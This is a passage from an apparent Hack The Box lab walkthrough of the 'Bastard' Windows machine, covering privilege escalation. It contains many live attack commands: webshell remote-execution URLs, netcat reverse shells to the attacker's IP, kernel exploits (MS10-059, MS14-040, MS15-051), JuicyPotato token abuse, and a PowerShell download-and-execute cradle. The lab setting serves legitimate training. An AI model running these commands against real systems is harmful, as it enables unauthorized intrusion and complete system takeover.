> curl -X GET "http://10.10.10.9/rce.php?cmd=%5C%5C10%2E10%2E14%2E10%5CSHARE%5Cnc64%2Eexe%20%2De%20cmd%2Eexe%2010%2E10%2E14%2E10%209999"

In our listener, we are back in a "cmd" shell. This time, when we run the batch script, it works. There is alot of output from this script, and so the output shown below is only what we selected to show here:

```
C:\inetpub\drupal-7.54>winPEAS.bat
winPEAS.bat
...
"Microsoft Windows Server 2008 R2 Datacenter "                                                                   
   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)                
No Instance(s) Available.                                                                                        
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)                                                          
No Instance(s) Available.                                                                                        
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)                                       
No Instance(s) Available.                                                                                        
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)                    
No Instance(s) Available.                                                                                        
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)                                                      
No Instance(s) Available.                                                                                        
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)                   
No Instance(s) Available.                                                                                        
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)                                        
No Instance(s) Available.                                                                                        
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)                      
No Instance(s) Available.                                                                                        
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)                                   
No Instance(s) Available.                                                                                        
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)                                         
No Instance(s) Available.                                                                                        
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)                          
No Instance(s) Available.                                                                                        
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)                                                           
No Instance(s) Available.                                                                                        
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)                                                            
No Instance(s) Available.                                                                                        
MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)                                                            
No Instance(s) Available.                                                                                        
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)                                                         
No Instance(s) Available.                                                                                        
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)                                                      
No Instance(s) Available.                                                                                        
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)                                           
No Instance(s) Available.                                                                                        
MS04-020 patch is NOT installed 2K/SP4-POSIX)                                                                    
No Instance(s) Available.                                                                                        
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)                        
No Instance(s) Available.                                                                                        
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)                                     
No Instance(s) Available.                                                                                        
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)                                      
No Instance(s) Available.                                                                                        
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)                                                                  
No Instance(s) Available.                                                                                        
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)                                    
No Instance(s) Available.                                                                                        
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)                                                        
No Instance(s) Available.                                                                                        
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)                                                   
...
```

Unfortunately the script crashes before it finishes, and we lose our shell, However, we did get the above output which lists possible exploits. We can narrow this list down:

```
└─$ cat exploits.txt | grep -E "2008|2K8" | sort
"Microsoft Windows Server 2008 R2 Datacenter "                                                                   
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)                          
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)                                         
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)                      
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)                                        
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)                   
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)                                                      
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)                    
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)                                    
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)                        
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)                                      
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)                                     
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)                                       
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)      
                                                
```

## Privilege Escalation

We try the exploits from oldest to newest:

> MS08-025: attempted without success
>
> MS10-015: does not work on x64 targets&#x20;
>
> MS10-073: not attempted
>
> MS10-021:  no POC found
>
> MS10-059: EXPLOITED - see below
>
> MS10-092: not attempted (could only find metasploit poc)
>
> MS11-011: attempted without success
>
> MS13-005: not attempted
>
> MS14-040: EXPLOITED - see below
>
> MS15-051: EXPLOITED - see below&#x20;
>
> MS16-016: does not work on x64 targets
>
> MS16-032: attempted without success&#x20;
>
> MS17-017: attempted without success

### MS10-059

Description:

> MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege
>
> Tracing Registry Key ACL Vulnerability - CVE-2010-2554&#x20;
>
> An elevation of privilege vulnerability exists when Windows places incorrect access control lists (ACLs) on the registry keys for the Tracing Feature for Services. The vulnerability could allow an attacker to run code with elevated privileges.

Exploit binary:

{% embed url="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe" %}

Start a second listener, then run the exploit on the target via our SMB share:

```
C:\inetpub\drupal-7.54>\\10.10.14.10\SHARE\MS10-059.exe
\\10.10.14.10\SHARE\MS10-059.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>

C:\inetpub\drupal-7.54>\\10.10.14.10\SHARE\MS10-059.exe 10.10.14.10 8888
\\10.10.14.10\SHARE\MS10-059.exe 10.10.14.10 8888
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
C:\inetpub\drupal-7.54>
```

In our new listener we get a shell as "system":

```
└─$ nc -nvlp 8888                
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:65415.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system

C:\inetpub\drupal-7.54>
```

### MS14-040

Description:

> MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege
>
> Ancillary Function Driver Elevation of Privilege Vulnerability - CVE-2014-1767
>
> A vulnerability exists in the Ancillary Function Driver (AFD) that could allow elevation of privilege. An attacker who successfully exploited this vulnerability could execute arbitrary code and take complete control of an affected system.

Binary:

{% embed url="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-040/MS14-040-x64.exe" %}

Run the exploit on the target via our SMB share:

```
C:\inetpub\drupal-7.54>\\10.10.14.10\SHARE\MS14-040-x64.exe
\\10.10.14.10\SHARE\MS14-040-x64.exe

whoami

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>
```

### MS15-051

Description:

> Win32k Elevation of Privilege Vulnerability - CVE-2015-1701&#x20;
>
> An elevation of privilege vulnerability exists when the [Win32k.sys](https://technet.microsoft.com/en-us/library/security/dn848375.aspx) kernel-mode driver improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode.

Binary:

{% embed url="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip" %}

Download and unzip the archive. For this exploit, we'll be using "ms15-051x64.exe" via our SMB share. Let's start a new listener and run the exploit as follows:

```
C:\inetpub\drupal-7.54>\\10.10.14.10\SHARE\ms15-051x64.exe "C:\inetpub\drupal-7.54\nc64.exe 10.10.14.10 8888 -e cmd.exe"
\\10.10.14.10\SHARE\ms15-051x64.exe "C:\inetpub\drupal-7.54\nc64.exe 10.10.14.10 8888 -e cmd.exe"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 836 created.
==============================

```

In our listener, we get a shell as "system":

```
// Some c└─$ nc -nvlp 8888                                                                                          130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49285.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system

C:\inetpub\drupal-7.54>
```

### Juicypotato and SeImpersonatePrivilege&#x20;

An alternative method to gain privilege escalation is via the "user privileges".

Let's check our groups and privileges:

```
C:\inetpub\drupal-7.54>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

C:\inetpub\drupal-7.54>
```

We see that we have the "SeImpersonatePrivilege"

> The "Impersonate a client after authentication" user right (SeImpersonatePrivilege) is a Windows 2000 security setting that was first introduced in Windows 2000 SP4. By default, members of the device's local Administrators group and the device's local Service account are assigned the "Impersonate a client after authentication" user right. The following components also have this user right:
>
> * Services that are started by the Service Control Manager
> * Component Object Model (COM) servers that are started by the COM infrastructure and that are configured to run under a specific account

The following whitepaper describes this exploit and a bunch of other exploits that relate to abusing Windows tokens and is an execellent resource:

{% embed url="https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt" %}

Download the "Juicypotato.exe" binary from the following github repo and save it in the SMB share directory:

{% embed url="https://github.com/ohpe/juicy-potato/releases" %}

We'll also need a copy of netcat on the target. Transfer it from the SMB share directory:

```
C:\inetpub\drupal-7.54>copy \\10.10.14.10\SHARE\nc64.exe
copy \\10.10.14.10\SHARE\nc64.exe
        1 file(s) copied.

C:\inetpub\drupal-7.54>
```

Next, we need a "CLSID" to use for this specific version of Windows. We can use any of the ones on the following page, although some of them may not work.

{% embed url="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise" %}

Start a new listener, and run the following command to get a reverse shell:

> \10.10.14.10\SHARE\JuicyPotato.exe -l 2345 -p cmd.exe -a "/c C:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.14.10 8888" -t \* -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

```
C:\inetpub\drupal-7.54>\\10.10.14.10\SHARE\JuicyPotato.exe -l 2345 -p cmd.exe -a "/c C:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.14.10 8888" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
\\10.10.14.10\SHARE\JuicyPotato.exe -l 2345 -p cmd.exe -a "/c C:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.14.10 8888" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 2345
....
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\inetpub\drupal-7.54>
```

In our listener, we get a shell as "nt authority\system":

```
└─$ nc -nvlp 8888                                                                                          130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49276.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

## Alternative Exploit Method

Credits for this section: [ippsec:HackTheBox-Bastard](https://youtu.be/lP-E5vmZNC0)&#x20;

### Straight to "SYSTEM"

#### Method 1:

Using the methods discussed in the video we are able to get a shell on the target as the "system" user directly. This would require some advance knowledge of the target system including the following, which we could easliy gather using our PHP RCE by running the "systeminfo" command:

* The target is running an unpactched version of Windows Server 2008 R2&#x20;
* The target is running on the x86\_64 architecture

Start a netcat listener.

Download the "ms15-051x64.exe" binary as shown in the "MS15-051" section above.

Start a python3 webserver in the directory containing the exploit binary.

Run the following command:

> http://10.10.10.9/webshell.php?fupload=ms15-051x64.exe\&fupload=nc64.exe\&fexec=ms15-051x64.exe "nc64.exe 10.10.14.10 8888 -e cmd.exe"

In our listener we get a shell as "system":

```
└─$ nc -nvlp 8888
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49316.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system

C:\inetpub\drupal-7.54>
```

#### Method 2:

We could also simply check the user privileges to find that the user has the "SeImpersonatePrivilege" privlege, and verify the current working directory:

```
└─$ curl -X GET "http://10.10.10.9/rce.php?cmd=whoami%20%2Fpriv"

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

└─$ curl -X GET "http://10.10.10.9/rce.php?cmd=cd"              
C:\inetpub\drupal-7.54

```

A quick google for "SeImpersonatePrivilege privilege escalation" leads us to "JuicyPotato".

Start a netcat listener.

Download the "JuicyPotato.exe" binary as shown in the "Juicypotato and SeImpersonatePrivilege" section.

Start a python3 web server in the directory containing the exploit binary.

Upload the files by pasting the following URLs into the browser:

> [http://10.10.10.9/webshell.php?fupload=JuicyPotato.exe](http://10.10.10.9/webshell.php?fupload=JuicyPotato.exe)
>
> [http://10.10.10.9/webshell.php?fupload=nc64.exe](http://10.10.10.9/webshell.php?fupload=nc64.exe)

Finally, paste the following URL into the browser and send:

> http://10.10.10.9/webshell.php?fexec=JuicyPotato.exe -l 2345 -p cmd.exe -a "/c C:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.14.10 8888" -t \* -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

In our listener we get a shell as "system":

```
└─$ nc -nvlp 8888
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49336.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

### Powershell script execution

Download and update the "PowerUp.ps1" script by adding the following line to the end of the script:

> Invoke-AllChecks

We can then use our PHP remote command execution script at follows to get powershell script execution:

> [http://10.10.10.9/rce.php?cmd=echo%20IEX(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.10/PowerUp.ps1%27)%20|%20powershell%20-noprofile%20-](http://10.10.10.9/rce.php?cmd=echo%20IEX\(New-Object%20Net.WebClient\).DownloadString\(%27http://10.10.14.10/PowerUp.ps1%27\)%20|%20powershell%20-noprofile%20-)

The result is the output of the "Invoke-AllChecks" function that is run on the target.

## Resources
